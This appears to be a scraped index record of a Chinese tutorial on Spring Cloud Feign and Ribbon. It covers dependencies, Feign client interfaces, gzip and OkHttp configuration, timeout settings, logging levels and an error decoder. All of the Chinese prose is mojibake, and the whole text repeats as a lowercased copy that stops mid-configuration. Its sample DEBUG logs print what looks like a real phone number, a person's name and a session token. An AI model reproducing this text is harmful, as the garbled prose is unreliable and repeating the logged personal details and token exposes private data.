Feign\n\n\n# fegin ç®ä»\n\nfegin æ¯ Netflix å¼åçå£°æå¼ãæ¨¡æ¿åç HTTP å®¢æ·ç«¯ï¼å¶ä»¤è¯¥æ¥èª RetrofitãJAXRS-2.0 ä»¥å WebSocketãfeign å¯å¸®å©æä»¬æ´å ä¾¿æ·ï¼ä¼éçè°ç¨ HTTP APIã\nå¨ spring cloud ä¸­ï¼ä½¿ç¨ feign éå¸¸ç®åï¼åå»ºä¸ä¸ªæ¥å£ï¼å¹¶å¨æ¥å£ä¸æ·»å ä¸äºæ³¨è§£ï¼ä»£ç å°±å®æäºãfeign æ¯æå¤ç§æ³¨è§£ï¼ä¾å¦ feign èªå¸¦çæ³¨è§£æè JAX-RS æ³¨è§£ç­ ã\nspring cloud å¯¹ feign è¿è¡äºå¢å¼ºï¼ä½¿ feign æ¯æäº Spring MVC æ³¨è§£ï¼å¹¶æ´åäº Ribbon å Eureka\n, ä»èè®© Feign çä½¿ç¨æ´å ä¾¿æ·ã\n\n\n# ä½¿ç¨\n\næ·»å ä¾èµ\n\n\x3c!-- åå«äºRibbon å hystrix --\x3e\n<dependency>\n    <groupId>org.springframework.cloud</groupId>\n    <artifactId>spring-cloud-starter-openfeign</artifactId>\n</dependency>\n\n\n1\n2\n3\n4\n5\n\n\nç¼å æ¥å£ï¼path æ¯è¯·æ±æ§å¶å¨çè·¯å¾ï¼name æ¯è®¿é®æå¡ç application.name\n\n// name=eurekaéæ³¨åçæå¡\n@FeignClient(path = "test", name = "client-hyq-life-server")\npublic interface TestApi {\n\n\n    @RequestMapping(value = "/idnex", method = RequestMethod.GET)\n    String idnex();\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\nç¼åå®ç°\n\n@RestController\n@RequestMapping("test")\npublic class TestController implements TestApi {\n\n    @Autowired\n    private TestServer testServer;\n\n    @Override\n    public String idnex(){\n        return testServer.idnex();\n    }\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\nç¼åè°ç¨\n\n@RestController\n@RequestMapping("/test")\npublic class TestController {\n\n    @Autowired\n    private TestApi testApi;\n\n    @GetMapping("/index")\n    public String index(){\n        return testApi.idnex();\n    }\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\nå¦æä¸¤ä¸ªæå¡æ¯åç¦»çé½éè¦ç»å¯å¨ç±»å \n\n@EnableFeignClients\n@SpringBootApplication\npublic class BffAppServerApplication {\n\n    public static void main(String[] args) {\n        SpringApplication.run(BffAppServerApplication.class, args);\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# Feign å¯¹åç¼©çæ¯æ\n\nfeign:\n  # ä¸ä½¿ç¨ openfeign èªå¸¦ççæ­\n  hystrix:\n    enabled: false\n  compression:\n    #éç½®è¯·æ± GZIP åç¼©\n    request:\n      enabled: true\n      #éç½®åç¼©æ¯æç MIME TYPE\n      mime-types: text/xml,application/xml,application/json\n      #éç½®åç¼©æ°æ®å¤§å°çæå°éå¼,åªæè¶è¿äºè¿ä¸ªå¤§å°çè¯·æ±æä¼å¯¹å¶è¿è¡åç¼©ã,é»è®¤ 2048\n      min-request-size: 300\n    #éç½®ååº GZIP åç¼©\n    response:\n      enabled: true\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n\n# feign å¯¹ OkHttp çæ¯æ\n\nä¾èµ\n\n<dependency>\n    <groupId>org.springframework.cloud</groupId>\n    <artifactId>spring-cloud-starter-openfeign</artifactId>\n</dependency>\n<dependency>\n    <groupId>io.github.openfeign</groupId>\n    <artifactId>feign-okhttp</artifactId>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\næ¦æªæ¥å¿ï¼è¿éå»ºè®®åçææä¹ä¸äºã\n\n/**\n * @author big uncle\n * @date 2020/6/17 9:02\n * ok http æ¦æªæ¥å¿\n **/\n@Slf4j\npublic class OkHttpLogInterceptor implements Interceptor {\n\n    @Override\n    public Response intercept(Chain chain) throws IOException {\n        log.debug("OkHttpUrl : " + chain.request().url());\n        return chain.proceed(chain.request());\n    }\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\néç½®\n\n/**\n * @author big uncle\n * @date 2020/6/17 8:58\n **/\n@Configuration\n@ConditionalOnClass(Feign.class)\n@AutoConfigureBefore(FeignAutoConfiguration.class)\npublic class FeignOkHttpConfig {\n\n    @Bean\n    public okhttp3.OkHttpClient okHttpClient(){\n        return new okhttp3.OkHttpClient.Builder()\n                // è¯»åè¶æ¶è®¾ç½®\n                .readTimeout(60, TimeUnit.SECONDS)\n                // è¿æ¥è¶æ¶è®¾ç½®\n                .connectTimeout(60, TimeUnit.SECONDS)\n                //\n                .writeTimeout(120, TimeUnit.SECONDS)\n                .connectionPool(new ConnectionPool())\n                .addInterceptor(okHttpLogInterceptor())\n                // .addInterceptor();\n                .build();\n    }\n\n    @Bean\n    public OkHttpLogInterceptor okHttpLogInterceptor(){\n        return new OkHttpLogInterceptor();\n    }\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\néç½®åºç°é®é¢ï¼åç°éç½®çè¶æ¶æ¶é´ä¸ç´ä¸çæï¼æè¯»åæ¶é´è®¾ç½® 30 ç§ï¼å¨æ¦æªéé¢çåªæ 1 ç§ï¼æä»¥å¾å¤æ¶åæç¤ºè¶æ¶ã\næåæä¸ªå¤§ç¥è·æè¯´äºï¼fegin ä¸ç´é½æ¯ç¨çæ¯ default éç½®ï¼è®©æå¨ yml éç½® connectTimeoutï¼readTimeout\n\nfeign:\n  compression:\n    # è¯·æ±åç¼©\n    request:\n      enabled: true\n      mime-types: "text/xml,application/xml,application/json"\n      # ç¨äºè®¾ç½®è¯·æ±çæå°éå¼\n      min-request-size: 1024\n    # ååºåç¼©\n    response:\n      enabled: true\n  hystrix:\n    enabled: false\n  okhttp:\n    enabled: true\n  client:\n    config:\n      default:\n        connectTimeout: 30000\n        readTimeout: 40000\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\nç»è¿åç°çç¡®å¯ä»¥åå°ï¼å¨ä»£ç éçéç½®ä¼åçº§å±ç¶æ²¡æéç½®æä»¶é«ï¼æä¸ªäººè§å¾æ¯æé®é¢çï¼å¿½ç¶åæ³å°é£éç½®çæ± æ¯å¦ä¹æ¯æ ç¨çï¼å¾è§å¯ã\n\n\n# äºãæ¥å¿\n\nè¿éä¸ºäºçæ¯ä¸ªè¯·æ±çè·¯å¾ï¼åæ°ï¼èæ¶æä»¬å¯ä»¥è¿è¡å¦ä¸æä½ï¼loggerLevelï¼\n\nfeign:\n  compression:\n    # è¯·æ±åç¼©\n    request:\n      enabled: true\n      mime-types: "text/xml,application/xml,application/json"\n      # ç¨äºè®¾ç½®è¯·æ±çæå°éå¼\n      min-request-size: 1024\n    # ååºåç¼©\n    response:\n      enabled: true\n  hystrix:\n    enabled: false\n  okhttp:\n    enabled: true\n  client:\n    config:\n      default:\n        connectTimeout: 30000\n        readTimeout: 40000\n        # BASIC FULL HEADERS NONE\n        loggerLevel: BASIC\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\nBASIC æå°å¦ä¸\n\n2020-06-18 09:45:51.670 DEBUG 26772 --- [nio-8888-exec-1] com.giant.cloud.api.MenuApi              : [MenuApi#getSonDataMenuList] ---\x3e POST http://server-data-platform/menu/getSonDataMenuList HTTP/1.1\n2020-06-18 09:45:52.637 DEBUG 26772 --- [nio-8888-exec-1] com.giant.cloud.api.MenuApi              : [MenuApi#getSonDataMenuList] <--- HTTP/1.1 200  (966ms)\n2020-06-18 09:45:52.767 DEBUG 26772 --- [nio-8888-exec-2] c.giant.cloud.api.ElectricityStationApi  : [ElectricityStationApi#getElectricityStationList] ---\x3e POST http://server-data-platform/electricityStation/getElectricityStationList HTTP/1.1\n2020-06-18 09:45:52.805 DEBUG 26772 --- [nio-8888-exec-2] c.giant.cloud.api.ElectricityStationApi  : [ElectricityStationApi#getElectricityStationList] <--- HTTP/1.1 200  (38ms)\n\n\n\n1\n2\n3\n4\n5\n\n\nFULL æå°å¦ä¸\n\n2020-06-18 09:54:05.190 DEBUG 29140 --- [nio-8888-exec-1] com.giant.cloud.api.MenuApi              : [MenuApi#getSonDataMenuList] ---\x3e POST http://server-data-platform/menu/getSonDataMenuList HTTP/1.1\n2020-06-18 09:54:05.191 DEBUG 29140 --- [nio-8888-exec-1] com.giant.cloud.api.MenuApi              : [MenuApi#getSonDataMenuList] Content-Length: 1733\n2020-06-18 09:54:05.191 DEBUG 29140 --- [nio-8888-exec-1] com.giant.cloud.api.MenuApi              : [MenuApi#getSonDataMenuList] Content-Type: application/json\n2020-06-18 09:54:05.191 DEBUG 29140 --- [nio-8888-exec-1] com.giant.cloud.api.MenuApi              : [MenuApi#getSonDataMenuList] \n2020-06-18 09:54:05.191 DEBUG 29140 --- [nio-8888-exec-1] com.giant.cloud.api.MenuApi              : [MenuApi#getSonDataMenuList] {"data":{"id":null,"parentId":null,"menuName":null,"menuPath":"/electricityStation/list","menuOrder":null,"icon":null,"remarks":null,"menuData":null,"menuButton":null},"token":"5a717dca1142d685c8aa54b45d0388c8","user":{"id":1,"account":"15771720565","name":"å¯è°¦æ¶¦","phone":"15771720565","onlineState":null,"remarks":"fdsafdsa","rolesId":1,"avatar":null,"token":"5a717dca1142d685c8aa54b45d0388c8","roles":{"id":1,"roleName":"è¶çº§ç®¡çå","remarks":"2222","menus":null},"menus":[{"id":1,"parentId":0,"menuName":"å¤§å±å±ç¤º","menuPath":"/dashboard","menuOrder":1000,"icon":"el-icon-monitor","remarks":null,"menuData":false,"menuButton":false,"child":[]},{"id":2,"parentId":0,"menuName":"æ°æ®åæ","menuPath":"/dataAnalysis","menuOrder":2000,"icon":"el-icon-data-line","remarks":null,"menuData":false,"menuButton":false,"child":[]},{"id":3,"parentId":0,"menuName":"ç³»ç»ç®¡ç","menuPath":"/setting","menuOrder":3000,"icon":"el-icon-setting","remarks":null,"menuData":false,"menuButton":false,"child":[{"id":5,"parentId":3,"menuName":"è§è²ç®¡ç","menuPath":"/setting/roles","menuOrder":3200,"icon":null,"remarks":null,"menuData":false,"menuButton":false,"child":[]},{"id":6,"parentId":3,"menuName":"èåç®¡ç","menuPath":"/setting/menus","menuOrder":3300,"icon":null,"remarks":null,"menuData":false,"menuButton":false,"child":[]}]},{"id":16,"parentId":0,"menuName":"çµç«ç®¡ç","menuPath":"/electricityStation","menuOrder":4000,"icon":"el-icon-lightning","remarks":null,"menuData":false,"menuButton":false,"child":[{"id":17,"parentId":16,"menuName":"çµç«ä¿¡æ¯","menuPath":"/electricityStation/list","menuOrder":4100,"icon":null,"remarks":"ååºææçµç«","menuData":false,"menuButton":false,"child":[]}]}]}}\n2020-06-18 09:54:05.191 DEBUG 29140 --- [nio-8888-exec-1] com.giant.cloud.api.MenuApi              : [MenuApi#getSonDataMenuList] ---\x3e END HTTP (1733-byte body)\n2020-06-18 09:54:06.014 DEBUG 29140 --- [nio-8888-exec-1] com.giant.cloud.api.MenuApi              : [MenuApi#getSonDataMenuList] <--- HTTP/1.1 200  (822ms)\n2020-06-18 09:54:06.015 DEBUG 29140 --- [nio-8888-exec-1] com.giant.cloud.api.MenuApi              : [MenuApi#getSonDataMenuList] connection: keep-alive\n2020-06-18 09:54:06.015 DEBUG 29140 --- [nio-8888-exec-1] com.giant.cloud.api.MenuApi              : [MenuApi#getSonDataMenuList] content-type: application/json\n2020-06-18 09:54:06.015 DEBUG 29140 --- [nio-8888-exec-1] com.giant.cloud.api.MenuApi              : [MenuApi#getSonDataMenuList] date: Thu, 18 Jun 2020 01:54:05 GMT\n2020-06-18 09:54:06.015 DEBUG 29140 --- [nio-8888-exec-1] com.giant.cloud.api.MenuApi              : [MenuApi#getSonDataMenuList] keep-alive: timeout=60\n2020-06-18 09:54:06.015 DEBUG 29140 --- [nio-8888-exec-1] com.giant.cloud.api.MenuApi              : [MenuApi#getSonDataMenuList] transfer-encoding: chunked\n2020-06-18 09:54:06.015 DEBUG 29140 --- [nio-8888-exec-1] com.giant.cloud.api.MenuApi              : [MenuApi#getSonDataMenuList] \n2020-06-18 09:54:06.017 DEBUG 29140 --- [nio-8888-exec-1] com.giant.cloud.api.MenuApi              : [MenuApi#getSonDataMenuList] {"code":200,"msg":null,"data":[{"id":24,"parentId":17,"menuName":"çµç«æ°æ®","menuPath":"/electricityStation/data","menuOrder":4110,"icon":null,"remarks":null,"menuData":true,"menuButton":false,"child":[{"id":25,"parentId":24,"menuName":"å¹³é¡¶å±±","menuPath":"/electricityStation/data/pds","menuOrder":4111,"icon":null,"remarks":null,"menuData":true,"menuButton":false,"child":[]}]}]}\n2020-06-18 09:54:06.017 DEBUG 29140 --- [nio-8888-exec-1] com.giant.cloud.api.MenuApi              : [MenuApi#getSonDataMenuList] <--- END HTTP (388-byte body)\n2020-06-18 09:54:06.453 DEBUG 29140 --- [nio-8888-exec-3] c.giant.cloud.api.ElectricityStationApi  : [ElectricityStationApi#getElectricityStationList] ---\x3e POST http://server-data-platform/electricityStation/getElectricityStationList HTTP/1.1\n2020-06-18 09:54:06.453 DEBUG 29140 --- [nio-8888-exec-3] c.giant.cloud.api.ElectricityStationApi  : [ElectricityStationApi#getElectricityStationList] Content-Length: 1756\n2020-06-18 09:54:06.453 DEBUG 29140 --- [nio-8888-exec-3] c.giant.cloud.api.ElectricityStationApi  : [ElectricityStationApi#getElectricityStationList] Content-Type: application/json\n2020-06-18 09:54:06.453 DEBUG 29140 --- [nio-8888-exec-3] c.giant.cloud.api.ElectricityStationApi  : [ElectricityStationApi#getElectricityStationList] \n2020-06-18 09:54:06.453 DEBUG 29140 --- [nio-8888-exec-3] c.giant.cloud.api.ElectricityStationApi  : [ElectricityStationApi#getElectricityStationList] {"data":{"data":{"id":null,"parentId":null,"menuName":null,"menuPath":null,"menuOrder":null,"icon":null,"remarks":null,"menuData":null,"menuButton":null,"menuId":"25"},"current":1,"size":20},"token":"5a717dca1142d685c8aa54b45d0388c8","user":{"id":1,"account":"15771720565","name":"å¯è°¦æ¶¦","phone":"15771720565","onlineState":null,"remarks":"fdsafdsa","rolesId":1,"avatar":null,"token":"5a717dca1142d685c8aa54b45d0388c8","roles":{"id":1,"roleName":"è¶çº§ç®¡çå","remarks":"2222","menus":null},"menus":[{"id":1,"parentId":0,"menuName":"å¤§å±å±ç¤º","menuPath":"/dashboard","menuOrder":1000,"icon":"el-icon-monitor","remarks":null,"menuData":false,"menuButton":false,"child":[]},{"id":2,"parentId":0,"menuName":"æ°æ®åæ","menuPath":"/dataAnalysis","menuOrder":2000,"icon":"el-icon-data-line","remarks":null,"menuData":false,"menuButton":false,"child":[]},{"id":3,"parentId":0,"menuName":"ç³»ç»ç®¡ç","menuPath":"/setting","menuOrder":3000,"icon":"el-icon-setting","remarks":null,"menuData":false,"menuButton":false,"child":[{"id":5,"parentId":3,"menuName":"è§è²ç®¡ç","menuPath":"/setting/roles","menuOrder":3200,"icon":null,"remarks":null,"menuData":false,"menuButton":false,"child":[]},{"id":6,"parentId":3,"menuName":"èåç®¡ç","menuPath":"/setting/menus","menuOrder":3300,"icon":null,"remarks":null,"menuData":false,"menuButton":false,"child":[]}]},{"id":16,"parentId":0,"menuName":"çµç«ç®¡ç","menuPath":"/electricityStation","menuOrder":4000,"icon":"el-icon-lightning","remarks":null,"menuData":false,"menuButton":false,"child":[{"id":17,"parentId":16,"menuName":"çµç«ä¿¡æ¯","menuPath":"/electricityStation/list","menuOrder":4100,"icon":null,"remarks":"ååºææçµç«","menuData":false,"menuButton":false,"child":[]}]}]}}\n2020-06-18 09:54:06.454 DEBUG 29140 --- [nio-8888-exec-3] c.giant.cloud.api.ElectricityStationApi  : [ElectricityStationApi#getElectricityStationList] ---\x3e END HTTP (1756-byte body)\n2020-06-18 09:54:06.483 DEBUG 29140 --- [nio-8888-exec-3] c.giant.cloud.api.ElectricityStationApi  : [ElectricityStationApi#getElectricityStationList] <--- HTTP/1.1 200  (29ms)\n2020-06-18 09:54:06.484 DEBUG 29140 --- [nio-8888-exec-3] c.giant.cloud.api.ElectricityStationApi  : [ElectricityStationApi#getElectricityStationList] connection: keep-alive\n2020-06-18 09:54:06.484 DEBUG 29140 --- [nio-8888-exec-3] c.giant.cloud.api.ElectricityStationApi  : [ElectricityStationApi#getElectricityStationList] content-type: application/json\n2020-06-18 09:54:06.484 DEBUG 29140 --- [nio-8888-exec-3] c.giant.cloud.api.ElectricityStationApi  : [ElectricityStationApi#getElectricityStationList] date: Thu, 18 Jun 2020 01:54:05 GMT\n2020-06-18 09:54:06.484 DEBUG 29140 --- [nio-8888-exec-3] c.giant.cloud.api.ElectricityStationApi  : [ElectricityStationApi#getElectricityStationList] keep-alive: timeout=60\n2020-06-18 09:54:06.484 DEBUG 29140 --- [nio-8888-exec-3] c.giant.cloud.api.ElectricityStationApi  : [ElectricityStationApi#getElectricityStationList] transfer-encoding: chunked\n2020-06-18 09:54:06.484 DEBUG 29140 --- [nio-8888-exec-3] c.giant.cloud.api.ElectricityStationApi  : [ElectricityStationApi#getElectricityStationList] \n2020-06-18 09:54:06.484 DEBUG 29140 --- [nio-8888-exec-3] c.giant.cloud.api.ElectricityStationApi  : [ElectricityStationApi#getElectricityStationList] {"code":200,"msg":null,"data":{"current":1,"size":20,"total":1,"records":[{"createTime":"2020-06-15T03:46:17.000+00:00","updateTime":"2020-06-15T03:46:17.000+00:00","deleteFlag":false,"id":1,"menuId":25,"name":"å¹³é¡¶å±±æ°è½æºé¡¹ç®1æ","buildingDegree":30,"cityName":"å¹³é¡¶å±±","cityId":"410400","lng":"113.308","lat":"33.7352","remarks":"æµè¯æ°æ®"}]}}\n2020-06-18 09:54:06.484 DEBUG 29140 --- [nio-8888-exec-3] c.giant.cloud.api.ElectricityStationApi  : [ElectricityStationApi#getElectricityStationList] <--- END HTTP (362-byte body)\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\næå°±è¯å°è¿éäºï¼æ­£å¸¸æ¥è¯´ FULL å·²ç»è¶³å¤äºã\n\n\n# Feign çå¨å±å¼å¸¸å¤ç\n\n@Configuration\npublic class FeignClientErrorDecoder implements ErrorDecoder {\n\n    private static final Log log = LogFactory.getLog(FeignClientErrorDecoder.class);\n\n    @Override\n    public Exception decode(String methodKey, Response response) {\n        try {\n            String body = IoUtil.read(response.body().asInputStream(), "utf-8");\n            Map<String,String> errMap = JSONObject.parseObject(body, HashMap.class);\n            return new InternalException(errMap.get("message"));\n        }catch(Exception e){\n            return new InternalException(e.getMessage());\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n',normalizedContent:'# ribbon\n\n\n# ä¸ãå¯¹æ¯\n\nrpc\n\n * è¿ç¨è¿ç¨è°ç¨ï¼åè°ç¨æ¬å°æ¹æ³ä¸æ ·è°ç¨æå¡å¨çæå¡\n * æ¯æåæ­¥æå¼æ­¥\n * å®¢æ·ç«¯åæå¡å¨ä¹é´å»ºç« tcp è¿æ¥ï¼å¯ä»¥ä¸æ¬¡å»ºç«ä¸ä¸ªï¼ä¹å¯ä»¥å¤ä¸ªè°ç¨å¤ç¨ä¸æ¬¡è¿æ¥\n * rpc æ°æ®åå° (è°·æ­ protobuf ä»¥äºè¿å¶æ¹å¼ä¼ è¾)\n * æ¯è¾å¤æè¦è¿è¡ï¼ç¼ç ï¼è§£ç ï¼åºååï¼è¿æ¥ï¼ä¸¢åï¼æåï¼ç»åï¼åè®®å¶å®\n   rest (http)\n * http è¯·æ±ï¼æ¯æå¤ç§åè®®ååè½\n * å¼åæ¹ä¾¿ææ¬ä½\n * http æ°æ®åå¤§\n * java å¼åï¼httpclient urlconnection\n\n\n# äºãå¼å\n\nå¼å¥ä¾èµ\n\n<dependency>\n    <groupid>org.springframework.cloud</groupid>\n    <artifactid>spring-cloud-starter-netflix-ribbon</artifactid>\n</dependency>\n\n\n1\n2\n3\n4\n\n\nå¨ application ç§éç½®\n\n    @bean\n    @loadbalanced\n    public resttemplate resttemplate(){\n        return new resttemplate();\n    }\n\n\n1\n2\n3\n4\n5\n\n\nä¿®è´è½½åè¡¡æ¹ç­ç¥\n\n    /**\n     * åè½æè¿°: è´è½½åè¡¡ç­ç¥\n     * roundrobinrule:è½®è¯¢\n     * randomrule:éæº\n     * availabilityfilteringrule: ä¼åè¿æ»¤æç±äºå¤æ¬¡è®¿é®æéèå¤äºæ­è·¯å¨è·³é¸ç¶æçæå¡,ä»¥åå¹¶åçè¿æ¥æ°é\n     * è¶è¿éå¼çæå¡,ç¶åå¯¹å©ä½çæå¡åè¡¨æç§è½®è¯¢ç­ç¥è¿è¡è®¿é®;\n     * weightedresponsetimerule: æ ¹æ®å¹³åååºæ¶é´è®¡ç®æææå¡çæé,ååºæ¶é´è¶å¿«,æå¡æéè¶å¤§,è¢«éä¸­çæºçè¶é«;\n     * åå¯å¨æ¶,å¦æç»è®¡ä¿¡æ¯ä¸è¶³,åä½¿ç¨roundrobinruleç­ç¥,ç­ç»è®¡ä¿¡æ¯è¶³å¤æ¶,ä¼åæ¢å°weightedresponsetimerule\n     * retryrule: åæç§roundrobinruleçç­ç¥è·åæå¡,å¦æè·åæå¡å¤±è´¥,åå¨æå®æ¶é´åä¼è¿è¡éè¯,è·åå¯ç¨çæå¡;\n     * bestavailablerule: ä¼åè¿æ»¤æç±äºå¤æ¬¡è®¿é®æéèå¤äºæ­è·¯å¨è·³é¸ç¶æçæå¡,ç¶åéæ©ä¸ä¸ªå¹¶åéæå°çæå¡;\n     * zoneavoidancerule: é»è®¤è§å,å¤åå¤æ­serveræå¨åºåçæ§è½åserverçå¯ç¨æ§éæ©æå¡å¨;\n     * @return : com.netflix.loadbalancer.irule\n     * @author : big uncle\n     * @date : 2019/9/7 14:07\n     */\n    @bean\n    public irule myrule(){\n        //èªå®ä¹åè¡¡ç­ç¥\n        return new randomrule();\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\nå®éè°ç¨\n\n/**\n* è®¢åæ¶è´¹æå¡\n* @author shengwu ni\n*/\n@restcontroller\n@requestmapping("/consumer/order")\npublic class orderconsumercontroller {\n\n   /**\n    * è®¢åæå¡æä¾èæ¨¡åç url åç¼\n    */\n//    private static final string order_provider_url_prefix = "http://localhost:8001";\n   private static final string order_provider_url_prefix = "http://microservice-order";\n\n   @resource\n   private resttemplate resttemplate;\n\n   @getmapping("/get/{id}")\n   public torder getorder(@pathvariable long id) {\n\n       return resttemplate.getforobject(order_provider_url_prefix + "/provider/order/get/" + id, torder.class);\n   }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n\n# feign\n\n\n# fegin ç®ä»\n\nfegin æ¯ netflix å¼åçå£°æå¼ãæ¨¡æ¿åç http å®¢æ·ç«¯ï¼å¶ä»¤è¯¥æ¥èª retrofitãjaxrs-2.0 ä»¥å websocketãfeign å¯å¸®å©æä»¬æ´å ä¾¿æ·ï¼ä¼éçè°ç¨ http apiã\nå¨ spring cloud ä¸­ï¼ä½¿ç¨ feign éå¸¸ç®åï¼åå»ºä¸ä¸ªæ¥å£ï¼å¹¶å¨æ¥å£ä¸æ·»å ä¸äºæ³¨è§£ï¼ä»£ç å°±å®æäºãfeign æ¯æå¤ç§æ³¨è§£ï¼ä¾å¦ feign èªå¸¦çæ³¨è§£æè jax-rs æ³¨è§£ç­ ã\nspring cloud å¯¹ feign è¿è¡äºå¢å¼ºï¼ä½¿ feign æ¯æäº spring mvc æ³¨è§£ï¼å¹¶æ´åäº ribbon å eureka\n, ä»èè®© feign çä½¿ç¨æ´å ä¾¿æ·ã\n\n\n# ä½¿ç¨\n\næ·»å ä¾èµ\n\n\x3c!-- åå«äºribbon å hystrix --\x3e\n<dependency>\n    <groupid>org.springframework.cloud</groupid>\n    <artifactid>spring-cloud-starter-openfeign</artifactid>\n</dependency>\n\n\n1\n2\n3\n4\n5\n\n\nç¼å æ¥å£ï¼path æ¯è¯·æ±æ§å¶å¨çè·¯å¾ï¼name æ¯è®¿é®æå¡ç application.name\n\n// name=eurekaéæ³¨åçæå¡\n@feignclient(path = "test", name = "client-hyq-life-server")\npublic interface testapi {\n\n\n    @requestmapping(value = "/idnex", method = requestmethod.get)\n    string idnex();\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\nç¼åå®ç°\n\n@restcontroller\n@requestmapping("test")\npublic class testcontroller implements testapi {\n\n    @autowired\n    private testserver testserver;\n\n    @override\n    public string idnex(){\n        return testserver.idnex();\n    }\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\nç¼åè°ç¨\n\n@restcontroller\n@requestmapping("/test")\npublic class testcontroller {\n\n    @autowired\n    private testapi testapi;\n\n    @getmapping("/index")\n    public string index(){\n        return testapi.idnex();\n    }\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\nå¦æä¸¤ä¸ªæå¡æ¯åç¦»çé½éè¦ç»å¯å¨ç±»å \n\n@enablefeignclients\n@springbootapplication\npublic class bffappserverapplication {\n\n    public static void main(string[] args) {\n        springapplication.run(bffappserverapplication.class, args);\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# feign å¯¹åç¼©çæ¯æ\n\nfeign:\n  # ä¸ä½¿ç¨ openfeign èªå¸¦ççæ­\n  hystrix:\n    enabled: false\n  compression:\n    #éç½®è¯·æ± gzip åç¼©\n    request:\n      enabled: true\n      #éç½®åç¼©æ¯æç mime type\n      mime-types: text/xml,application/xml,application/json\n      #éç½®åç¼©æ°æ®å¤§å°çæå°éå¼,åªæè¶è¿äºè¿ä¸ªå¤§å°çè¯·æ±æä¼å¯¹å¶è¿è¡åç¼©ã,é»è®¤ 2048\n      min-request-size: 300\n    #éç½®ååº gzip åç¼©\n    response:\n      enabled: true\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n\n# feign å¯¹ okhttp çæ¯æ\n\nä¾èµ\n\n<dependency>\n    <groupid>org.springframework.cloud</groupid>\n    <artifactid>spring-cloud-starter-openfeign</artifactid>\n</dependency>\n<dependency>\n    <groupid>io.github.openfeign</groupid>\n    <artifactid>feign-okhttp</artifactid>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\næ¦æªæ¥å¿ï¼è¿éå»ºè®®åçææä¹ä¸äºã\n\n/**\n * @author big uncle\n * @date 2020/6/17 9:02\n * ok http æ¦æªæ¥å¿\n **/\n@slf4j\npublic class okhttploginterceptor implements interceptor {\n\n    @override\n    public response intercept(chain chain) throws ioexception {\n        log.debug("okhttpurl : " + chain.request().url());\n        return chain.proceed(chain.request());\n    }\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\néç½®\n\n/**\n * @author big uncle\n * @date 2020/6/17 8:58\n **/\n@configuration\n@conditionalonclass(feign.class)\n@autoconfigurebefore(feignautoconfiguration.class)\npublic class feignokhttpconfig {\n\n    @bean\n    public okhttp3.okhttpclient okhttpclient(){\n        return new okhttp3.okhttpclient.builder()\n                // è¯»åè¶æ¶è®¾ç½®\n                .readtimeout(60, timeunit.seconds)\n                // è¿æ¥è¶æ¶è®¾ç½®\n                .connecttimeout(60, timeunit.seconds)\n                //\n                .writetimeout(120, timeunit.seconds)\n                .connectionpool(new connectionpool())\n                .addinterceptor(okhttploginterceptor())\n                // .addinterceptor();\n                .build();\n    }\n\n    @bean\n    public okhttploginterceptor okhttploginterceptor(){\n        return new okhttploginterceptor();\n    }\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\néç½®åºç°é®é¢ï¼åç°éç½®çè¶æ¶æ¶é´ä¸ç´ä¸çæï¼æè¯»åæ¶é´è®¾ç½® 30 ç§ï¼å¨æ¦æªéé¢çåªæ 1 ç§ï¼æä»¥å¾å¤æ¶åæç¤ºè¶æ¶ã\næåæä¸ªå¤§ç¥è·æè¯´äºï¼fegin ä¸ç´é½æ¯ç¨çæ¯ default éç½®ï¼è®©æå¨ yml éç½® connecttimeoutï¼readtimeout\n\nfeign:\n  compression:\n    # è¯·æ±åç¼©\n    request:\n      enabled: true\n      mime-types: "text/xml,application/xml,application/json"\n      # ç¨äºè®¾ç½®è¯·æ±çæå°éå¼\n      min-request-size: 1024\n    # ååºåç¼©\n    response:\n      enabled: true\n  hystrix:\n    enabled: false\n  okhttp:\n    enabled: true\n  client:\n    config:\n      default:\n        connecttimeout: 30000\n        readtimeout: 